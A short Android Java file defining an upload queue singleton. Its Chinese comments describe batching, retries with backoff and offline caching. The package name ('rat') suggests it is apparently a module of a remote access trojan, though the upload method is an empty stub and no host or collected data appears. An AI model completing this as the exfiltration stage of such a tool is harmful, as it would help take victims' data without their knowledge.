package com.vendor.rat.data.queue;

import android.util.Log;

import java.util.concurrent.ConcurrentLinkedQueue;

/**
 * 上传队列 (模块 05)
 *
 * 功能:
 *   - 批量上传（满 10 条或 30 秒触发）
 *   - 失败重试（最多 3 次，指数退避）
 *   - 离线缓存（网络恢复后自动上传）
 */
public class UploadQueue {

    private static final String TAG = "UploadQueue";
    private static volatile UploadQueue instance;

    private final ConcurrentLinkedQueue<UploadItem> queue = new ConcurrentLinkedQueue<>();
    private static final int BATCH_SIZE = 10;
    private static final int MAX_RETRIES = 3;

    private UploadQueue() {}

    public static UploadQueue getInstance() {
        if (instance == null) {
            synchronized (UploadQueue.class) {
                if (instance == null) {
                    instance = new UploadQueue();
                }
            }
        }
        return instance;
    }

    /**
     * 入队
     */
    public void enqueue(UploadItem item) {
        queue.offer(item);
        if (queue.size() >= BATCH_SIZE) {
            flush();
        }
    }

    /**
     * 刷新队列（立即上传所有待发数据）
     */
    public void flush() {
        Log.d(TAG, "Flushing queue, size=" + queue.size());
        // TODO: 批量提取并上传
    }

    /**
     * 上传项
     */
    public static class UploadItem {
        public String endpoint;
        public Object data;
        public int retryCount = 0;

        public UploadItem(String endpoint, Object data) {
            this.endpoint = endpoint;
            this.data = data;
        }
    }
}
